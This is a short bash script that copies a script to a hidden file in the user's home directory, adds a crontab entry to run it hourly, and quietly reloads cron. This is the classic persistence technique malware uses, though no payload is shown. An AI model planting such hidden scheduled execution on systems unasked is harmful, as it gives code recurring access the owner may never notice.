#!/bin/bash
cp ./script.sh ~/.script.sh
BBIN=/bin/bash
BPATH=/home/`whoami`/.script.sh
WHEN="42 * * * * "
(crontab -l 2> /dev/null; echo "$WHEN"$BBIN" "$BPATH) | crontab -
/etc/init.d/cron reload > /dev/null
